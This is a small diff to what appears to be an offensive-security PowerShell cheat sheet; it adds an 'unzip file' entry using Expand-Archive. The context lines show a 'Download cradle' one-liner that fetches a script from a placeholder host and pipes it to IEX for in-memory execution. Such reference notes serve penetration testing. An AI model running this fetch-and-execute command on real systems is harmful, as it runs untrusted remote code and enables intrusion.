@@ -2,6 +2,12 @@
 
 #plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 
 
+## unzip file
+#plateform/windows #target/local #cat/UTILS #tag/powershell 
+```powershell
+Expand-Archive -Path <file> -DestinationPath <path>
+```
+
 ## Download cradle
 ```powershell
 (new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
